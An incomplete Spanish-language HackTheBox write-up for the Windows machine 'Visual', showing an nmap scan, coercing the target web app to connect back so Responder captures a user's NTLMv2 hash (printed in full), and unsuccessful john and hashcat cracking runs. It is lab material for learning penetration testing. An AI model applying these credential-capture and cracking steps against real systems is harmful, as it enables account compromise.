---
redirect_from:
  - /posts/VISUAL-WriteUp/

title: "Visual - WriteUp"
date: Wed Aug 14 2024 13:00:00 GMT+0200 (Central European Summer Time)
categories: [WriteUps, HTB, Windows]
tags: [ctf, nmap, htb, responder, hashcat, sudo, windows, apache, php, bash]
image: /assets/img/htb-writeups/Pasted-image-20231209134637.png
---

{% include machine-info.html
  machine="Visual"
  os="Windows"
  difficulty="Medium"
  platform="HTB"
%}

![Visual](/assets/img/htb-writeups/Pasted-image-20231209134637.png)

------

Máquina Windows
Dificultad: Media

-----

NMAP

```bash
# Nmap 7.94SVN scan initiated Sat Dec  9 13:34:00 2023 as: nmap -sCV -p 80 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl -oN targeted -oX targetedXML 10.129.47.133
Nmap scan report for 10.129.47.133
Host is up (0.049s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
|_http-title: Visual - Revolutionizing Visual Studio Builds
```

HTTP:

![VISUAL](/assets/img/htb-writeups/Pasted-image-20231209134637.png)

En la misma página, en la parte de abajo vemos un campo que nos llama la atención.

![VISUAL](/assets/img/htb-writeups/Pasted-image-20231209135309.png)

Aquí para probar me he puesto en escucha con _responder_ y en el campo de entrada he puesto mi IP.

En el campo de entrada he puesto "http://10.10.14.68" que es la IP de la VPN de HTB.

En una terminal me he puesto en escucha con responder:

```bash
$ sudo responder -I tun0 -wA
```

![VISUAL](/assets/img/htb-writeups/Pasted-image-20231209135022.png)

Le damos a "Submit" y nos llevará ala siguiente página:

![VISUAL](/assets/img/htb-writeups/Pasted-image-20231209135400.png)

Esperamos un rato y pulsamos sobre "Return to homepage" y nos vamos a la terminal del responder

![VISUAL](/assets/img/htb-writeups/Pasted-image-20231209135059.png)

```
[HTTP] NTLMv2 Client   : 10.129.47.133
[HTTP] NTLMv2 Username : VISUAL\enox
[HTTP] NTLMv2 Hash     : enox::VISUAL:58474f0ead372728:072C63A816774F419273B207FBFB8375:01010000000000000F750A8C9D2ADA014E32899C7663B9B20000000002000800350031003600360001001E00570049004E002D0048005200420053003800330049003000590034004A000400140035003100360036002E004C004F00430041004C0003003400570049004E002D0048005200420053003800330049003000590034004A002E0035003100360036002E004C004F00430041004C000500140035003100360036002E004C004F00430041004C0008003000300000000000000000000000003000009E6B8204FE674A35E5870611D6A29764436C87B821BE270D7B38DCFAC9F832C00A001000000000000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310034002E00360038000000000000000000
[*] Skipping previously captured hash for VISUAL\enox
```

Bingo! tenemos un hash NTLM de versión 2 del usuario _enox_.

Vamos a intentar descifrarlo con _john_

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:06 DONE (2023-12-09 13:57) 0g/s 2324Kp/s 2324Kc/s 2324KC/s !)(OPPQR..*7¡Vamos!
Session completed. 
```

Probamos con _hashcat_ con reglas y sin reglas.

```bash
$ hashcat -m 27100 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...
$ hashcat -m 27100 hash /usr/share/wordlists/rockyou.txt
```

Nada. Da "exhausted" :(

Vamos a buscar otra manera de entrar.

Hemos añadido por causalidad el dominio _visual.htb_ al fichero hosts de nuestro equipo y ahora la web muestra más información que antes...

![VISUAL](/assets/img/htb-writeups/Pasted-image-20231209151727.png)

Creamos un archivo .git de prueba (test.git) y levantamos un servidor HTTP con Python para ver qué pasa.

Vamos ala web y le indicamos nuestra Ip y el archivo que queremos compartir.

![VISUAL](/assets/img/htb-writeups/Pasted-image-20231209141548.png)

Le damos a "Submit" y esperamos.

Nos coge el archivo...

![VISUAL](/assets/img/htb-writeups/Pasted-image-20231209141804.png)

Y si volvemos a la web nos muestra un mensaje de error:

![VISUAL](/assets/img/htb-writeups/Pasted-image-20231209141847.png)

Nos apuntamos la supuesta URL de subida del archivo.

http://10.129.47.133/uploads/b5da043ba8d52f253ba8246c29369b/

Espera un archivo con extensión .sln. Parece que espera un proyecto de Visual C# en formato de Web tipo GitHub... Investiguemos un poco por la red.

LO DEJO APARCADO POR AHORA PORQUE SE SALE DEL TEMARIO DEL OSCP.
---

**Última actualización**: 2024-08-14<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
